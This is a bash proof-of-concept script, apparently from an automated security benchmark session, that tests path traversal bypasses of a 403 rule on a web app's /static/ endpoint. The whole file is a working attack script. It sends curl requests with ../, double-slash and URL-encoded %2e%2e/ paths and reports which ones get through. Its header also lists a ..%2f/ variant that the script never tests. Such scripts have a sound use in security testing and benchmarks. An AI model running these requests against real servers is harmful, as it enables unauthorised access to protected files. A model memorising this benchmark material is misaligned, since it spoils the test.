#!/bin/bash
# POC: Demonstrates path traversal bypass of 403 access control on /static/ endpoint using multiple techniques (../, ..%2f/, %2e%2e/, double slashes) to access resources outside the intended directory
# Target: ./repo
# Created: 2025-11-07T21:36:06.397Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# Path Traversal Bypass POC - /static/ endpoint 403 Access Control Bypass
# This POC demonstrates multiple path traversal techniques to bypass directory access control

TARGET_URL="${1:-http://localhost:8080}"
VERBOSE="${2:-true}"

echo "============================================"
echo "Path Traversal Bypass POC"
echo "Target: $TARGET_URL"
echo "============================================"
echo ""

# Test 1: Direct /static/ access (should get 403)
echo "[*] Test 1: Direct /static/ access (expected: 403 Forbidden)"
RESPONSE=$(curl -s -w "\n%{http_code}" -I "$TARGET_URL/static/" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "403" ]; then
    echo "✓ Correctly returns 403 - Access denied"
else
    echo "⚠ Unexpected response: $HTTP_CODE"
fi
echo ""

# Test 2: Path traversal bypass with ../
echo "[*] Test 2: Path traversal with ../ (expected: 200 OK - BYPASS)"
RESPONSE=$(curl -s -w "\n%{http_code}" -I "$TARGET_URL/static/../" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED - Traversal bypass successful! Got 200 OK"
    BYPASS_FOUND=1
else
    echo "✗ No bypass detected - Got: $HTTP_CODE"
fi
echo ""

# Test 3: Access to index.php via traversal
echo "[*] Test 3: Access index.php via ../ traversal (expected: 200 OK - BYPASS)"
RESPONSE=$(curl -s -w "\n%{http_code}" -I "$TARGET_URL/static/../index.php" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(curl -s "$TARGET_URL/static/../index.php" 2>&1 | head -c 200)
echo "HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED - index.php accessible via traversal!"
    echo "Content preview: $BODY"
    BYPASS_FOUND=1
else
    echo "✗ Unable to access - Got: $HTTP_CODE"
fi
echo ""

# Test 4: Double slash variant ..//
echo "[*] Test 4: Double slash variant ..// (expected: 200 OK - BYPASS)"
RESPONSE=$(curl -s -w "\n%{http_code}" -I "$TARGET_URL/static/..///" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED - Double slash traversal works!"
    BYPASS_FOUND=1
else
    echo "⚠ Result: $HTTP_CODE"
fi
echo ""

# Test 5: URL-encoded traversal %2e%2e
echo "[*] Test 5: URL-encoded traversal %2e%2e/ (expected: 200 OK - BYPASS)"
RESPONSE=$(curl -s -w "\n%{http_code}" -I "$TARGET_URL/static/%2e%2e/" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED - URL-encoded traversal works!"
    BYPASS_FOUND=1
else
    echo "⚠ Result: $HTTP_CODE"
fi
echo ""

# Summary
echo "============================================"
echo "Summary:"
if [ "$BYPASS_FOUND" = "1" ]; then
    echo "✓ Path traversal bypass vulnerability CONFIRMED"
    echo "  Multiple techniques successfully bypass 403 access control"
    exit 0
else
    echo "✗ No bypass techniques confirmed"
    exit 1
fi
echo "============================================"